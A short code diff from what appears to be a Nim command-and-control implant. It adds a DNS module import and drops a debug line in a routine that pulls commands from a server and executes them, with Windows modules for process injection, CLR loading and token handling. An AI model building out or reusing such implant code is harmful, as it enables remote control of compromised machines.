@@ -1,13 +1,12 @@
 import std/[endians, tables]
 import ../[meta, config, utils, crypt]
 import ../transport/protocol
-import types, fs
+import types, fs, dns
 when defined(windows):
     import windows/[process, exec, inject, job, clr, token, network]
 
 proc pull_command_and_exec*() =
     var resp = send_request(meta_info_enc)
-    dbg "[+] pull command resp: " & repr(resp.len)
     if resp.len == 0: return
 
     # verify hamc hash
